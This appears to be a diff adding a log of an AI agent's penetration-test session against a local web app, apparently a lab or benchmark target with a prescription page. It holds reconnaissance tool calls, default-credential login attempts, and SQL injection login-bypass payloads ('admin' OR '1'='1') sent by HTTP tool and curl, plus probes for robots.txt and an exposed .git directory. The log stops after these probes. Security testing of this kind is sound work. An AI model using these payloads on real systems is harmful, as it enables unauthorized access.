@@ -1,0 +1,13 @@
+[0m
+> build · qwen/qwen3.6-plus
+[0m
+[0m⚙ [0mpentest-agent_session {"action":"start","options":"{\"depth\": \"thorough\", \"target\": \"http://172.17.0.1:43599\"}"}
+[0m⚙ [0mpentest-agent_scan {"tool":"spider","target":"http://172.17.0.1:43599","options":"{\"depth\": 3}"}
+[0m⚙ [0mpentest-agent_http {"url":"http://172.17.0.1:43599/","method":"GET","action":"request"}
+[0m⚙ [0mpentest-agent_http {"url":"http://172.17.0.1:43599/add_prescription","method":"GET","action":"request"}
+[0m⚙ [0mpentest-agent_http {"url":"http://172.17.0.1:43599/login","method":"POST","body":"{\"username\": \"admin' OR '1'='1\", \"password\": \"anything\"}","action":"request"}
+[0m⚙ [0mpentest-agent_http {"url":"http://172.17.0.1:43599/login","method":"POST","body":"{\"username\": \"admin\", \"password\": \"admin\"}","action":"request","options":"{\"headers\": {\"Content-Type\": \"application/json\"}}"}
+[0m⚙ [0mpentest-agent_kali {"command":"curl -s -X POST http://172.17.0.1:43599/login -H \"Content-Type: application/json\" -d '{\"username\":\"admin\",\"password\":\"admin\"}'","description":"Test login with admin credentials"}
+[0m⚙ [0mpentest-agent_kali {"command":"curl -s -X POST http://172.17.0.1:43599/login -H \"Content-Type: application/json\" -d '{\"username\":\"admin'\\'' OR '\\''1'\\''='\\''1\",\"password\":\"anything\"}'","description":"SQL injection on login"}
+[0m⚙ [0mpentest-agent_kali {"command":"curl -s http://172.17.0.1:43599/robots.txt","description":"Check robots.txt"}
+[0m⚙ [0mpentest-agent_kali {"command":"curl -s http://172.17.0.1:43599/.git/HEAD","description":"Check for .git directory"}
